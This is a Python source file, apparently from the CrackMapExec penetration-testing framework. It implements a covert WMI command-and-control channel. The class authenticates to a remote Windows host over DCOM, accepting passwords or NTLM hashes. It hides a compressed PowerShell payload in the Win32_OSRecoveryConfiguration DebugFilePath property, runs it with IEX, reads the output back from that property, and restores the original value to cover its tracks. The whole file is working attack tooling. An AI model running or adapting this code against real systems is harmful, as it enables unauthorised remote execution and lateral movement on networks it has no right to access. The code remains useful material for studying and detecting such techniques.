import logging
from gevent import sleep
from cme.c2 import C2
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from cme.helpers.powershell import ps_deflate_and_encode, ps_decode_and_inflate


class Wmi(C2):
    '''
    Uses WMI itself as a C2 channel by storing payloads and outputs in WMI class(es) properties
    '''

    def __init__(self, proto, payload, exec_methods, force_ps32, ret_output):
        C2.__init__(self, proto, payload, exec_methods, force_ps32, ret_output)

        self.command_with_output = "$a = Get-WMIObject -Class Win32_OSRecoveryConfiguration; " \
                                   "$out = IEX (Invoke-Decompress -Data $a.DebugFilePath) | Out-String; " \
                                   "$a.DebugFilePath = Invoke-Compress -Data $out; $a.Put()"

        self.command_without_output = "$a = Get-WMIObject -Class Win32_OSRecoveryConfiguration; " \
                                      "IEX (Invoke-Decompress -Data $a.DebugFilePath)"

        logging.debug('Creating new DCOM connection')
        self.dcom = DCOMConnection(
            self.target, self.username, self.password,
            self.domain, self.lmhash, self.nthash,
            self.aesKey, oxidResolver=True, doKerberos=self.doKerberos
        )

        logging.debug("Creating new iWbemServices instance")
        iInterface = self.dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
        self.iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
        iWbemLevel1Login.RemRelease()

    def run(self):
        compressed_payload = ps_deflate_and_encode(self.create_ps_payload(self.payload))

        records = self.read()
        self.write(records, compressed_payload)
        self.execute_command(self.command_with_output if self.ret_output else self.command_without_output)
        output = self.get_output(compressed_payload)
        self.write(records)

        if self.dcom:
            self.dcom.disconnect()

        return output

    def read(self, query="Select * From Win32_OSRecoveryConfiguration"):
        records = []

        iEnumWbemClassObject = self.iWbemServices.ExecQuery(query)
        while True:
            try:
                pEnum = iEnumWbemClassObject.Next(0xffffffff, 1)[0]
                records.append(pEnum.getProperties())
            except Exception as e:
                if str(e).find('S_FALSE') < 0:
                    raise e
                else:
                    break

        iEnumWbemClassObject.RemRelease()

        return records

    def write(self, records, payload="%SystemRoot%\MEMORY.DMP", attribute='DebugFilePath', wmi_class='Win32_OSRecoveryConfiguration'):

        def autoconvert(v):
            type_dict = {
                'string': str,
                'uint32': int,
                'bool': bool
            }

            return type_dict[v['stype']](v['value'])

        activeScript, _ = self.iWbemServices.GetObject(wmi_class)
        activeScript = activeScript.SpawnInstance()
        for record in records:
            for k, v in record.iteritems():
                setattr(activeScript, k, autoconvert(v))

        if payload:
            setattr(activeScript, attribute, payload)

        logging.debug("activeScript.DebugFilePath: {}...".format(activeScript.DebugFilePath[:100]))

        resp = self.iWbemServices.PutInstance(activeScript.marshalMe())

        if resp.GetCallStatus(0) != 0:
            raise Exception('Writing payload to {}.{} - ERROR (0x{})'.format(wmi_class, attribute, resp.GetCallStatus(0)))

        logging.debug('Writing payload to {}.{} - OK'.format(wmi_class, attribute))

    def get_output(self, compressed_payload):
        if not self.ret_output:
            return

        while True:
            records = self.read("Select DebugFilePath from Win32_OSRecoveryConfiguration")
            if records[0]['DebugFilePath']['value'][:20] != compressed_payload[:20]:
                return ps_decode_and_inflate(records[0]['DebugFilePath']['value'])
            logging.debug("Output not yet written to WMI property")
            sleep(4)
